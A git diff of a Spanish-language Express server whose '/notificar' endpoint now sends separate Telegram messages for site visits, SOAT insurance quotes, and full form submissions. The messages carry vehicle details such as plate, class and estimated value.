@@ -13,7 +13,26 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 app.post('/notificar', async (req, res) => {
   const datos = req.body;
 
-  const mensaje = `
+  let mensaje = "";
+
+  // 🚨 Mensaje para visita simple al sitio
+  if (datos.tipo === "visita") {
+    mensaje = "👀 *Nuevo visitante ingresó al sitio*";
+
+  // 📊 Mensaje para cotización (cuando presionan el botón "Cotizar")
+  } else if (datos.tipo === "cotizacion") {
+    mensaje = `
+📊 *Nueva cotización de SOAT:*
+🚗 *Placa:* ${datos.placa || 'No proporcionada'}
+📄 *Clase:* ${datos.clase || 'N/A'}
+📌 *Subtipo:* ${datos.subtipo || 'N/A'}
+🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
+💰 *Valor estimado:* ${datos.valor || '$0'}
+`.trim();
+
+  // 📥 Mensaje completo al enviar el formulario
+  } else {
+    mensaje = `
 📥 *Nueva solicitud de SOAT*:
 🚗 *Placa:* ${datos.placa || 'No proporcionada'}
 💵 *Valor estimado:* ${datos.valor || '$0'}
@@ -34,7 +53,8 @@ app.post('/notificar', async (req, res) => {
 🧾 *Clase:* ${datos.clase || 'N/A'}
 📌 *Subtipo:* ${datos.subtipo || 'N/A'}
 🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
-`;
+`.trim();
+  }
 
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -45,7 +65,7 @@ app.post('/notificar', async (req, res) => {
 
     res.status(200).json({ ok: true, msg: 'Notificación enviada a Telegram' });
   } catch (error) {
-    console.error('Error enviando a Telegram:', error.message);
+    console.error('❌ Error enviando a Telegram:', error.message);
     res.status(500).json({ ok: false, msg: 'Error enviando a Telegram' });
   }
 });
